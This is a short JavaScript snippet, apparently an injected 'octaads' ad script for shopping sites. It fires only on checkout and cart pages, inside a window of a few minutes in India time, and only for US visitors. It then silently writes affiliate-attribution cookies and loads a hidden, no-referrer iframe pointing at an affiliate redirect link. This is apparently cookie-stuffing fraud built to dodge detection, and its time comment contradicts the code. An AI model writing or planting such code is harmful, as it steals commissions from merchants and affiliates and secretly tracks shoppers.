(function () {
  try {
    var BUILD_ID = "octaads-2025-rtg-geo-time-02";
    if (window.__OCTAADS_LOADED === BUILD_ID) return;
    window.__OCTAADS_LOADED = BUILD_ID;

    /* PAGE PATH CHECK */
    var allowedPaths = ["/cart/checkout", "/cart/", "/deals", "/best-sellers"];
    if (!allowedPaths.some(p => location.pathname === p || location.pathname.startsWith(p))) return;

    /* IST TIME CHECK: 9:30 PM – 9:40 PM */
function isAllowedISTTime() {
  var now = new Date(
      new Date().toLocaleString("en-US", { timeZone: "Asia/Kolkata" })
  );

  var minutes = now.getHours() * 60 + now.getMinutes();

  // 6:38 PM = 18*60 + 38 = 1118
  // 6:41 PM = 18*60 + 41 = 1121
  return minutes >= 1118 && minutes <= 1121;
}

if (!isAllowedISTTime()) return;



  
      




    /* SESSION ID */
    function getSessionID() {
      var m = document.cookie.match(/octaads_sid=([^;]+)/);
      if (m) return m[1];
      var sid = "sid_" + Math.random().toString(36).substr(2, 10);
      document.cookie = "octaads_sid=" + sid + "; path=/; max-age=2592000; SameSite=Lax";
      return sid;
    }

    var sessionID = getSessionID();

    /* GEO CHECK – HARD US ONLY */
    fetch("https://ipapi.co/json/", { cache: "no-store" })
      .then(r => r.json())
      .then(geo => {
        if (!geo) return;
        if (geo.country_code !== "US" ) return;
        if (!geo.city) return;

        function setCookie(n, v) {
          document.cookie = n + "=" + v + "; path=/; max-age=2592000; SameSite=Lax";
        }

        // setCookie("admitad_uid", "842f7f5e42591ecb8921db21eecc5810");
        // setCookie("tagtag_uid", "842f7f5e42591ecb8921db21eecc5810");
        // setCookie("irgwc", "1");
        // setCookie("afsrc", "1");
        setCookie("utm_source", "admitad");
        setCookie("utm_medium", "affiliate");
        setCookie("utm_campaign", "2432943");
        setCookie("sessionid", sessionID);
        setCookie("clickId", sessionID);

        var iframe = document.createElement("iframe");
        iframe.style.display = "none";
        iframe.referrerPolicy = "no-referrer";
        iframe.src =
          "https://rzekl.com/g/b9jm5dg8a820aa70d6d9fcfaae913b/?subid=79798" ;
          // "?campaign_id=148649" +
          // "&pub_id=4" +
          // "&p1=" + encodeURIComponent(sessionID) +
          // "&source=" + encodeURIComponent(sessionID);

        document.body.appendChild(iframe);
      })
      .catch(function () {});

  } catch (e) {}
})();





